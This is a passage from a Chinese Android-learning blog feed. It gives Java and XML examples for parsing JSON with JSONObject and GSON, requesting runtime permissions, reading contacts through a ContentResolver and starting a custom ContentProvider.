<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseJSONWithJSONObject</span><span class="params">(String jsonData)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            JSONArray jsonArray = <span class="keyword">new</span> JSONArray(jsonData);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; jsonArray.length(); i++)&#123;</span><br><span class="line">                JSONObject jsonObject = jsonArray.getJSONObject(i);</span><br><span class="line">                String id = jsonObject.getString(<span class="string">"id"</span>);</span><br><span class="line">                String name = jsonObject.getString(<span class="string">"name"</span>);</span><br><span class="line">                String version = jsonObject.getString(<span class="string">"version"</span>);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"id is "</span> + id);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"name is "</span> + name);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"version is "</span> + version);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用GSON"><a href="#使用GSON" class="headerlink" title="使用GSON"></a>使用GSON</h3><p>首先添加依赖环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implementation 'com.google.code.gson:gson:2.7'</span><br></pre></td></tr></table></figure><p>GSON库可以将一段JSON格式的字符串自动映射成一个对象（这里用Person），所以就可以直接定义一个类，然后自动解析即可了。</p><p>如果是数组的话会稍微麻烦：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Person&gt; people = gson.fromJson(JsonData, <span class="keyword">new</span> TypeToken&lt;List&lt;Person&gt;&gt;()&#123;&#125;.getType());</span><br></pre></td></tr></table></figure><p>接下来新建一个App类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String version;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getId</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(String id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getVersion</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> version;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setVersion</span><span class="params">(String version)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.version = version;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后修改代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    TextView responseText;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (v.getId() == R.id.send_request)&#123;</span><br><span class="line">                sendRequestWithOkHttp();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123; </span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">"http://localhost/get_data.json"</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responseData = response.body().string();</span><br><span class="line">                    parseJSONWithGSON(responseData);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseJSONWithGSON</span><span class="params">(String jsonData)</span> </span>&#123;</span><br><span class="line">        Gson gson = <span class="keyword">new</span> Gson();</span><br><span class="line">        List&lt;App&gt; appList = gson.fromJson(jsonData, <span class="keyword">new</span> TypeToken&lt;List&lt;App&gt;&gt;()&#123;&#125;.getType());</span><br><span class="line">        <span class="keyword">for</span>(App app : applist)&#123;</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"id is "</span> + app.getId());</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"name is "</span> + app.getName()));</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"version is "</span> + app.getVersion())); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;多媒体这块感觉也是不太需要，快速略过，了解下就行。&lt;/p&gt;
&lt;h1 id=&quot;多媒体的运用&quot;&gt;&lt;a href=&quot;#多媒体的运用&quot; class=
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Android-day6</title>
    <link href="https://nuoye-blog.github.io/2020/06/01/Android/Android-day6/"/>
    <id>https://nuoye-blog.github.io/2020/06/01/Android/Android-day6/</id>
    <published>2020-06-01T04:25:00.000Z</published>
    <updated>2020-06-01T04:24:30.850Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内容提供器探究"><a href="#内容提供器探究" class="headerlink" title="内容提供器探究"></a>内容提供器探究</h1><h2 id="内容提供器简介"><a href="#内容提供器简介" class="headerlink" title="内容提供器简介"></a>内容提供器简介</h2><p>内容提供器主要用于在不同的应用程序之间实现数据共享的功能，并且保证被访问数据的安全性。</p><h2 id="运行时权限"><a href="#运行时权限" class="headerlink" title="运行时权限"></a>运行时权限</h2><p>Android6.0系统中引入了运行时权限。</p><h3 id="Android权限机制详解"><a href="#Android权限机制详解" class="headerlink" title="Android权限机制详解"></a>Android权限机制详解</h3><p>运行时权限即可以在软件的使用过程中再对某一项权限申请授权。</p><p>Android的权限归为两类：<br>普通权限：不会直接威胁到用户的安全和隐私的权限。对于这部分权限申请，系统会自动帮我们进行授权。</p><p>危险权限：可能会触及用户隐私，或对设备安全性造成影响的权限。必须由用户手动点击授权才可以。</p><p>当用户同意授权某一危险权限时，则其权限组中其他权限也会同时被授权。</p><p>危险权限表：</p><p><img src="./day6/1.jpg" alt=""></p><p>可以访问<a href="http://developer.android.com/reference/android/Manifest.premission.html查看Android系统中的完整权限列表。" target="_blank" rel="noopener">http://developer.android.com/reference/android/Manifest.premission.html查看Android系统中的完整权限列表。</a></p><h3 id="在程序运行时申请权限"><a href="#在程序运行时申请权限" class="headerlink" title="在程序运行时申请权限"></a>在程序运行时申请权限</h3><p>新建一个RuntimePermissionTest项目。</p><p>添加按钮，并修改代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    Button make_call = (Button) findViewById(R.id.make_call);</span><br><span class="line">    make_call.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Intent intent =<span class="keyword">new</span> Intent(Intent.ACTION_CALL);</span><br><span class="line">                intent.setData(Uri.parse(<span class="string">"tel:10086"</span>));</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;<span class="keyword">catch</span>(SecurityException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并添加权限：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.CALL_PHONE"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>编译运行后，在Android4.4版本中点击按钮后可以发现自动打开了拨号界面。但是</p><p>在Android6.0版本中，点击按钮没有任何反应，查看logcat中断日志，可以看到：<code>java.lang.SecurityException: Permission Denial: starting Intent</code>的字样。</p><p>这是因为6.0以上的系统在使用危险权限时都必须进行运行时权限处理。</p><p>修改代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button make_call = (Button) findViewById(R.id.make_call);</span><br><span class="line">        make_call.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED)&#123;</span><br><span class="line">                    ActivityCompat.requestPermissions(MainActivity.<span class="keyword">this</span>, <span class="keyword">new</span> String[]&#123; Manifest.permission.CALL_PHONE&#125;, <span class="number">1</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    call();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">call</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_CALL);</span><br><span class="line">            intent.setData(Uri.parse(<span class="string">"tel:10086"</span>));</span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(SecurityException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, String[] permissions, <span class="keyword">int</span>[] grantResults)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(requestCode)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span>(grantResults.length &gt; <span class="number">0</span> &amp;&amp; grantResults[<span class="number">0</span>] == PackageManager.PERMISSION_GRANTED)&#123;</span><br><span class="line">                    call();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">"you denied the permission"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行后点击按钮，在6.0版本以上就会弹出授权窗口（第一授权后，继续点击则默认已授权，需卸载后才会恢复权限设置，或者在权限设置关闭权限），同意后就会自动跳转到拨号界面了。其中ActivityCompat.requestPermissions()的第三个参数为请求码，用于下面重写函数onRequestPermissionsResult()的switch。</p><h2 id="访问其他程序中的数据"><a href="#访问其他程序中的数据" class="headerlink" title="访问其他程序中的数据"></a>访问其他程序中的数据</h2><p>内容提供器的用法一般有两种，一种是使用现有的内容提供器来读取和操作相应程序中的数据；另一种是创建自己的内容提供器给我们程序的数据提供外部访问接口。</p><p>如果一个应用程序通过内容提供器对其数据提供了外部访问接口，那么任何其他的应用程序就都可以对这部分数据进行访问。</p><h3 id="ContentResolver的基本用法"><a href="#ContentResolver的基本用法" class="headerlink" title="ContentResolver的基本用法"></a>ContentResolver的基本用法</h3><p>ContentResolver提供了一系列方法用于对数据进行CRUD操作，可以用Context中的getContentResolver()方法获取该类的实例</p><p>ContentResolver中的增删改查方法都是不接收表名参数的，而是用一个Uri参数代替，这个参数被称为内容URI。</p><p>内容URI给内容提供器中的数据建立了唯一标识符，它主要由两部分组成：authority和path。authority用于对不同的应用程序做区分，path则是用于对同一应用程序中不同的表做区分，通常会添加到authority后面。内容URI最标注的格式写法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content:&#x2F;&#x2F;com.example.app.provide&#x2F;table1</span><br></pre></td></tr></table></figure><h3 id="读取系统联系人"><a href="#读取系统联系人" class="headerlink" title="读取系统联系人"></a>读取系统联系人</h3><p>新建一个ContactsTest项目，修改布局文件为如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ListView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/contacts_view"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    ArrayAdapter&lt;String&gt; adapter;</span><br><span class="line">    List&lt;String&gt; contactsList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        ListView contactsView = (ListView) findViewById(R.id.contacts_view);</span><br><span class="line">        adapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(<span class="keyword">this</span>, android.R.layout.simple_list_item_1, contactsList);</span><br><span class="line">        contactsView.setAdapter(adapter);</span><br><span class="line">        <span class="keyword">if</span>(ContextCompat.checkSelfPermission(<span class="keyword">this</span>, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)&#123;</span><br><span class="line">            ActivityCompat.requestPermissions(<span class="keyword">this</span>, <span class="keyword">new</span> String[]&#123;Manifest.permission.READ_CONTACTS&#125;, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            readContacts();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readContacts</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Cursor cursor = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (cursor != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">                    String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));</span><br><span class="line">                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));</span><br><span class="line">                    contactsList.add(displayName + <span class="string">"\n"</span> + number);</span><br><span class="line">                &#125;</span><br><span class="line">                adapter.notifyDataSetChanged();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(cursor != <span class="keyword">null</span>)&#123;</span><br><span class="line">                cursor.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, String[] permissions, <span class="keyword">int</span>[] grantResults)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(requestCode)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span>(grantResults.length &gt; <span class="number">0</span> &amp;&amp; grantResults[<span class="number">0</span>] == PackageManager.PERMISSION_GRANTED)&#123;</span><br><span class="line">                    readContacts();</span><br><span class="line">                &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">"You denied the permission"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且添加权限声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_CONTACTS"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>然后编译运行并授权就可以了。</p><h2 id="创建自己的内容提供器"><a href="#创建自己的内容提供器" class="headerlink" title="创建自己的内容提供器"></a>创建自己的内容提供器</h2><h3 id="创建内容提供器的步骤"><a href="#创建内容提供器的步骤" class="headerlink" title="创建内容提供器的步骤"></a>创建内容提供器的步骤</h3><p>打开DataTest项目，去掉MyDatabaseHelper中的Toast提示，因为跨程序访问时我们不能直接使用Toast。</p><p>新建Content Provider，命名为DatabaseProvider，authority指定为com.example.databasetest.provider，修改代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span 